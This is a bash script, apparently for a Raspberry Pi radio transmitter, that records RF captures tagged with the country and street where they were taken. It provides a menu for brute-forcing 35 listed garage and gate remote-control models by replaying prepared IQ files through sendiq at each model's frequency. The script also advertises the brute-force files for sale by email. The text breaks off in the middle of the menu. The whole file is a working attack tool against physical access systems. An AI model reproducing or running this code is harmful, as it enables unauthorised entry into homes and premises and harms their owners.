noir2='\033[7;30m'
noir='\033[1;30m'
white2='\e[7;37m'
white='\e[1;37m'
blanc='\e[1;35m'
vert2='\e[7;32m'
vert='\e[1;32m'
bleu_clair='\e[1;36m'
bleu='\e[1;34m'
rouge='\e[1;31m'
jaune='\e[1;33m'
rouge2='\033[1;31m'
rouge3='\033[7;31m'
jaune2='\e[7;33m'
bleu2='\e[7;34m'
cyan='\033[0;36m'
violet='\033[1;35m'
signal=$(ls -Q 2> /dev/null .Capture | wc -l)
signalwc=$(c=$(cat .signal | wc -l);echo "$c/3" | bc)
signall=$(sed 1d .signal)
ssignal=$(cat .nbr-signal)
date1=$(date | awk '{print $2}')
date2=$(date | awk '{print $3}')
date3=$(date | awk '{print $5}')
last=$(cat .last)

#fonction counter signal
function compt_signal(){
cat .crypt | grep crypter > /dev/null
if [[ $? != 0 ]];then
cignal=$(ls -Q 2> /dev/null .Capture | wc -l)
echo $cignal > .nbr-signal
fi
}
compt_signal

function compteur_signal(){
cignal=$(ls -Q 2> /dev/null .Capture | wc -l)
echo $cignal > .nbr-signal
}

#fonction deletion file test
function supp_test(){
clear
sudo rm test_textbox > /dev/null
sudo rm .Capture/test_textbox > /dev/null
}

function horloge(){
chars="/-\|"

            for (( i=0; i<${#chars}; i++ )); do
               sleep 0.1
            echo -en "${chars:$i:1}" "\r"
                done

for (( i=0; i<${#chars}; i++ )); do
               sleep 0.1
            echo -en "${chars:$i:1}" "\r"
                done

for (( i=0; i<${#chars}; i++ )); do
               sleep 0.2
            echo -en "${chars:$i:1}" "\r"
                done
}
function horlogebis(){
chars="/-\|"

            for (( i=0; i<${#chars}; i++ )); do
               sleep 0.1
            echo -en "${chars:$i:1}" "\r"
                done

for (( i=0; i<${#chars}; i++ )); do
               sleep 0.1
            echo -en "${chars:$i:1}" "\r"
                done

}

# functions for displaying information
function info(){
dateune=$(cat .last | awk '{print $1}')
datedeux=$(date | awk '{print $2}')
if [[ $dateune < 20 && -s .INFO ]];then
echo "You haven't captured a signal for a while go fill your database❗️" > .INFO
fi

if [ -s .pass ];then
> /dev/null
else
echo " ⛔ Hurry to choose a password to protect your database ⛔ => Parameter => Security" > .INFO
fi

stockage=$(du -h .Capture | awk '{print $1}' | grep -o "^[0-9]")
if (( $stockage > 100 & $stockage < 150 ));then
echo "The storage of your database to exceed 100 MO" > .INFO
fi

pourcent=$(df -h | sed -n 2p | awk '{print $5}' | grep -o "^[0-9]")
if [[ $pourcent > 75 && $pourcent < 78 && -s .INFO ]];then
echo "The storage of your raspberry pi has exceeded 75%❗" > .INFO
fi
}





# fonction play signal
function signal_envoyer(){
echo
echo -e $bleu_clair "🔇 Signal not sent 🔇"
read -p "Do you want to record it? (Yes/No) :" reponses
if [[ $reponses == "Yes" ]] || [[ $reponses == "yes" ]] || [[ $reponses == "Y" ]] || [[ $reponses == "y" ]];then
echo -e $bleu_clair
read -p "Name of the file :" nom
cp record.iq .Capture/record.iq
sleep 0.4
mv .Capture/record.iq .Capture/$nom-$frequence.iq
echo -e "$cyan Location"
printf  "🚩 country : " ;printf $vert ;read pays
printf  "🏠 $cyan Street and number (Additional info) :" ;printf $vert ;read rue
echo $date1 $date2 at $date3 > .last
echo -e $rouge
horloge
echo -e $vert "Capture:  $bleu $nom-$frequence.iq  $rouge enregistred!"
echo -e "$bleu [$signalwc]" "$bleu_clair Name: $rouge $nom" "📶$bleu_clair Frequency:" "$vert $frequence MHz"  "🕗$blanc Captured: $jaune $date1 $date2 at $date3   🔊" | toilet -F border -f term >> .signal
echo -e "🚩$bleu_clair Country: $rouge $pays 🏠 $bleu_clair Street: $white $rue  ℹ️ " | toilet -F border -f term >> .signal
sleep 2
else
  echo
  echo -e $bleu_clair "The signal is captured in record.iq but you will lose it the next time you use it"
fi
}
# fonction brute-force
function brute (){
clear
echo -e $rouge
echo "Brute" | toilet -f mono12; printf "🔐"
echo -e $rouge3 "                            FORCE🔓                          " | toilet -F border -f term;
echo
echo -e "          $bleu📱 Number of remote control: $jaune 35"
echo
echo -e $jaune " Berner " | toilet -f term -F border
echo -e " $blanc[$white 1 $blanc] $white Berner 40 Dip Quick $vert 40MHz "
echo
echo -e $rouge " BOSCH " | toilet -f term -F border
echo -e " $blanc[$white 2 $blanc] $white BOSCH 12Dip  $vert 26.975MHz "
echo -e " $blanc[$white 3 $blanc] $white BOSCH 12Dip  $vert 26.995MHz "
echo -e " $blanc[$white 4 $blanc] $white BOSCH 12Dip  $vert 40.685MHz "
echo
echo -e $rouge3 "$white $rouge3 CDS " | toilet -f term -F border
echo -e " $blanc[$white 5 $blanc] $white CDS 40 $vert 40MHz "
echo
echo -e $jaune " Came " | toilet -f term -F border
echo -e " $blanc[$white 6 $blanc] $white Came Top $vert 433.92MHz "
echo
echo -e $vert " Cardin " | toilet -f term -F border
echo -e " $blanc[$white 7 $blanc] $white Cardin 27 Quick  $vert 27MHz "
echo -e " $blanc[$white 8 $blanc] $white Cardin 433 Quick $vert 433.92MHz "
echo
echo -e $bleu " Chamberlain " | toilet -f term -F border
echo -e " $blanc[$white 9 $blanc] $white Chamberlain 27 Quick $vert 27MHz "
echo
echo -e $violet " Dickert " | toilet -f term -F border
echo -e " $blanc[$white 10 $blanc] $white Dickert 40 FM     $vert 40MHz "
echo -e " $blanc[$white 11 $blanc] $white Dickert 433 Quick $vert 433.92MHz "
echo -e " $blanc[$white 12 $blanc] $white Dickert 433L      $vert 433.92MHz "
echo -e " $blanc[$white 13 $blanc] $white Dickert 868 FM    $vert 868MHz "
echo
echo -e $jaune2 "$bleu Einhell " | toilet -f term -F border
echo -e " $blanc[$white 14 $blanc] $white Einhell 27 Quick    $vert 27MHz "
echo
echo -e $jaune2 "$rouge2 Endress " | toilet -f term -F border
echo -e " $blanc[$white 15 $blanc] $white Endress 27          $vert 27MHz "
echo
echo -e $noire "$white Hoermann " | toilet -f term -F border
echo -e " $blanc[$white 16 $blanc] $white Hoermann 27         $vert 27MHz "
echo
echo -e $bleu2 "$white $noir Käuferle " | toilet -f term -F border
echo -e " $blanc[$white 17 $blanc] $white Käuferle 27        $vert 27MHz "
echo -e " $blanc[$white 18 $blanc] $white Käuferle 40        $vert 40MHz "
echo -e " $blanc[$white 19 $blanc] $white Käuferle 433       $vert 433.92MHz "
echo
echo -e $white "$noir2  Marantec " | toilet -f term -F border
echo -e " $blanc[$white 20 $blanc] $white Marantec 27        $vert 27MHz "
echo
echo -e $bleu2 "$bleu $bleu2 $noir2  Nice " | toilet -f term -F border
echo -e " $blanc[$white 21 $blanc] $white Nice 26            $vert 26MHz "
echo -e " $blanc[$white 22 $blanc] $white Nice 27            $vert 27MHz "
echo -e " $blanc[$white 23 $blanc] $white Nice 30            $vert 30MHz "
echo -e " $blanc[$white 24 $blanc] $white Nice 30.9          $vert 30.9MHz "
echo -e " $blanc[$white 25 $blanc] $white Nice flo 433       $vert 433.92MHz "
echo
echo -e $white "$noir $white2 $noir2  Rademacher " | toilet -f term -F border
echo -e " $blanc[$white 26 $blanc] $white Rademacher 40      $vert 40MHz "
echo
echo -e $jaune2 "$noir $noir2 $jaune2  Ruku " | toilet -f term -F border
echo -e " $blanc[$white 27 $blanc] $white Ruku SA 40 AM      $vert 40MHz "
echo -e " $blanc[$white 28 $blanc] $white Ruku SA 433 AM     $vert 433MHz "
echo -e " $blanc[$white 29 $blanc] $white Ruku SF 40 FM      $vert 40MHz "
echo -e " $blanc[$white 30 $blanc] $white Ruku SF 433 FM     $vert 433MHz "
echo
echo -e $vert "$white $noir2 $vert  Tedsen " | toilet -f term -F border
echo -e " $blanc[$white 31 $blanc] $white Tedsen 27          $vert 27MHz "
echo -e " $blanc[$white 32 $blanc] $white Tedsen 433         $vert 433MHz "
echo -e " $blanc[$white 33 $blanc] $white Tedsen 433 Quick   $vert 433MHz "
echo
echo -e $white "$white $noir2 $bleu  Tormatic (Novoferm)" | toilet -f term -F border
echo -e " $blanc[$white 34 $blanc] $white Tormatic 40          $vert 40MHz "
echo -e " $blanc[$white 35 $blanc] $white Tormatic 433         $vert 433MHz "
echo
echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"

echo -e "$bleu[$white i $bleu] $cyan Info on remote controls with pictures"

ps -aux | awk '{print $14}' | grep "0.0.0.0:1122" > /dev/null

if [[ $? = 0 ]];then
echo -e $white "Web server: http://$ip:1122 $rouge actived" | toilet -f term -F border
fi
echo -e $bleu
printf  "📊 Choose the number of the remote control : " ;printf $white ;read n

if [[ $n =~ ^[0-9]+$ && $n -ne 00 ]]; then
  if [[ ! -d ".derrow" ]];then
    echo
    echo -e $rouge2 "For hard work and security reasons remote keys are only available on request and at an affordable price of 25$ (package includes 35 remotes of 10.5 GB in size)❗"
    echo -e $white "Send my an mail to receive captures from remote controls: tues.banni@gmail.com"
    echo
    sleep 6
    brute
  fi
fi



case $n in

  i)
    ip=$(hostname -I | awk '{print $1}')
    echo "Info in web server: http://$ip:1122  📶" > test_textbox
    whiptail --textbox test_textbox 12 60
    sudo php -S 0.0.0.0:1122 -t .info &
    brute
   ;;

  1)function berner(){
     clear
     echo -e $white "$white $rouge3 Berner" | toilet -f mono9 -F border | lolcat
     echo -e $jaune " Berner 40 Dip Quick" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 1min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"


     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 2min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ././sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-berner-quickdip-40.iq &
     bash timeur.sh 1
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Clap ENTER" ;printf $white ;read n
     berner
     elif [[ $nuu = 00 ]];then
     berner
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Durée de brut: $white 6min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ././sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/berner-quickdip-40.iq &
     bash timeur.sh 5
     echo -e "                             $vert Signal terminer✅"
     echo
     printf  "📊 $vert Back to the menu : Clap ENTER" ;printf $white ;read n
     berner

     else
     numinvalide
     sleep 1
     berner
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     numinvalide
     berner
     fi
     }
     berner
     ;;
   2)function bosh(){
     clear
     echo -e $white "$white $rouge3 BOSH " | toilet -f mono9 -F border | lolcat
     echo -e $rouge " BOSCH 12Dip " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.975MHz   $cyan ⏳ Time: $white 25min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 BOSH 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.975MHz   $cyan ⏳ Time: $white 25min" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.975"e6 -t u8 -i .derrow/1-bosh12dip-26-975.iq &
     bash timeur.sh 24
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Clap ENTER" ;printf $white ;read n
     bosh
     elif [[ $n = 2 ]];then
      echo -e " $white BOSCH 12Dip  $vert 26.975MHz " | toilet -f term -F border
      echo -e " $white BOSCH 12Dip  $vert 26.995MHz " | toilet -f term -F border
      echo -e " $white BOSCH 12Dip  $vert 40.685MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 3 remotes: $white 85min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER to start the brute force : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 84 &
     sudo ./sendiq -s 250000 -f "26.975"e6 -t u8 -i .derrow/1-bosh12dip-26-975.iq
     sudo ./sendiq -s 250000 -f "26.995"e6 -t u8 -i .derrow/1-bosh12dip-26-995.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-bosh12dip-40-685.iq
     echo
     printf  "📊 $vert Back to the menu : Clap ENTER" ;printf $white ;read n
     bosh

     elif [[ $nu = 00 ]];then
     brute

     else
     bosh
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     bosh
     fi


     }
     bosh


    ;;
  3)function bosh2(){
     clear
     echo -e $white "$white $rouge3 BOSH " | toilet -f mono9 -F border | lolcat
     echo -e $rouge "BOSCH 12Dip" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.995MHz   $cyan ⏳ Time: $white 30min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 BOSCH 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.995MHz   $cyan ⏳ Time: $white 30min" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.995"e6 -t u8 -i .derrow/1-bosh12dip-26-995.iq &
     bash timeur.sh 29
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     bosh2


     elif [[ $n = 2 ]];then
      echo -e " $white BOSCH 12Dip  $vert 26.975MHz " | toilet -f term -F border
      echo -e " $white BOSCH 12Dip  $vert 26.995MHz " | toilet -f term -F border
      echo -e " $white BOSCH 12Dip  $vert 40.685MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 3 remotes: $white 85min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute force : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 84 &
     sudo ./sendiq -s 250000 -f "26.975"e6 -t u8 -i .derrow/1-bosh12dip-26-975.iq
     sudo ./sendiq -s 250000 -f "26.995"e6 -t u8 -i .derrow/1-bosh12dip-26-995.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-bosh12dip-40-685.iq
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     bosh2

     elif [[ $nu = 00 ]];then
     brute

     else
     bosh2
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     bosh2
     fi


     }
     bosh2

    ;;
  4)function bosh3(){
     clear
     echo -e $white "$white $rouge3 BOSH " | toilet -f mono9 -F border | lolcat
     echo -e $rouge "BOSCH 12Dip" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 29min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 BOSCH 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 29min" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-bosh12dip-40-685.iq &
     bash timeur.sh 29
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     bosh3


     elif [[ $n = 2 ]];then
      echo -e " $white BOSCH 12Dip  $vert 26.975MHz " | toilet -f term -F border
      echo -e " $white BOSCH 12Dip  $vert 26.995MHz " | toilet -f term -F border
      echo -e " $white BOSCH 12Dip  $vert 40.685MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 3 remotes: $white 85min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute force : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 84 &
     sudo ./sendiq -s 250000 -f "26.975"e6 -t u8 -i .derrow/1-bosh12dip-26-975.iq
     sudo ./sendiq -s 250000 -f "26.995"e6 -t u8 -i .derrow/1-bosh12dip-26-995.iq
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-bosh12dip-40-685.iq
     echo
     printf  "📊 $vert Back to the menu: Press ENTER" ;printf $white ;read n
     bosh3

     elif [[ $nu = 00 ]];then
     bosh3

     else
     bosh3
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     bosh3
     fi


     }
     bosh3

    ;;
  5)function cds(){
     clear
     echo -e $white "$white $rouge3 CDS " | toilet -f mono9 -F border | lolcat
     echo -e $rouge3 "$white $rouge3 CDS 🇺 🇸 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge USA     $bleu 📶 frequency: $vert 40MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 4min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-CDS-40.iq &
     bash timeur.sh 4
     cds
     echo -e "                             $vert Signal finished✅"
     echo
     elif [[ $nuu = 00 ]];then
     cds
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequence: $vert 40.685MHz   $cyan ⏳ Durée de brut: $white 12min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/CDS-40.iq &
     bash timeur.sh 12
     echo -e "                             $vert Signal terminer✅"
     echo
     printf  "📊 $vert Retour au menu : Tappe ENTER" ;printf $white ;read n
     cds
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     cds
     fi

     }
     cds
    ;;

  6)function came(){
     clear
     echo -e $white "$white $rouge3 Came " | toilet -f mono9 -F border | lolcat
     echo -e $jaune "Came Top " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Italia     $bleu 📶 frequency: $vert 433.92Hz   $cyan ⏳ Time: $white 2min" 
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 2min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-came-top-433.iq &
     bash timeur.sh 2
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     came
     elif [[ $nuu = 00 ]];then
     came
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 10min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/came-top-433.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     came
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     came
     fi
     }
     came
    ;;
  7)function cardin2(){
     clear
     echo -e $white "$white $rouge3 Cardin " | toilet -f mono9 -F border | lolcat
     echo -e $vert "Cardin 27 Quick" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 27.195MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 2 Cardin 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.195MHz   $cyan ⏳ Time: $white 2min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.195"e6 -t u8 -i .derrow/1-cardin-quickdip.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     cardin2
     elif [[ $nuu = 00 ]];then
     cardin2
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.195MHz   $cyan ⏳ Time: $white 16min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.195"e6 -t u8 -i .derrow/cardin-quickdip-40.iq &
     bash timeur.sh 16
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     cardin2
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Cardin 27 Quick  $vert 27MHz " | toilet -f term -F border
      echo -e " $white Cardin 433 Quick $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 2 remotes: $white 10min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER to start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     bash timeur.sh 4 &
     #cardin 27
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-cardin-quick-433.iq
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     cardin2

     elif [[ $nu = 00 ]];then
     cardin2

     else
     cardin2
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     cardin2
     fi

     }
     cardin2

    ;;
  8)function cardin4(){
     clear
     echo -e $white "$white $rouge3 Cardin " | toilet -f mono9 -F border | lolcat
     echo -e $vert "Cardin 433 Quick" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 2 Cardin 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 4min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-cardin-quick-433.iq &
     bash timeur.sh 4
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     cardin4
     elif [[ $nuu = 00 ]];then
     cardin4
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 16min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/cardin-quick-433.iq &
     bash timeur.sh 16
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     cardin4
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Cardin 27 Quick  $vert 27MHz " | toilet -f term -F border
      echo -e " $white Cardin 433 Quick $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 2 remotes: $white 10min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     bash timeur.sh 4 &
     #cardin 27
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-cardin-quick-433.iq

     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     cardin4

     elif [[ $nu = 00 ]];then
     cardin4

     else
     cardin4
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     cardin4
     fi

     }
     cardin4

    ;;
  9)function chamberlain2(){
     clear
     echo -e $white "$white $rouge3 Chamberlain " | toilet -f slant -F border | lolcat
     echo -e $bleu "Chamberlain 27 Quick" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge USA     $bleu 📶 frequency: $vert 27.145MHz   $cyan ⏳ Time: $white 3min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.195MHz   $cyan ⏳ Time: $white 3min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.195"e6 -t u8 -i .derrow/1-chamberlain-quick-27.iq & 
     bash timeur.sh 3
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     chamberlain2
     elif [[ $nuu = 00 ]];then
     chamberlain2
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.195MHz   $cyan ⏳ Time: $white 9min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.195"e6 -t u8 -i .derrow/chamberlain-quick-27.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     chamberlain2
     fi
     elif [[ $n = 00 ]];then
     brute

     else
     chamberlain2
     fi

     }
     chamberlain2

    ;;
  10)function dickert(){
     clear
     echo -e $white "$white $rouge3 Dickert " | toilet -f mono9 -F border | lolcat
     echo -e $violet "Dickert 40 FM" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Nederlands     $bleu 📶 frequency: $vert 40.185MHz   $cyan ⏳ Time: $white 8min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
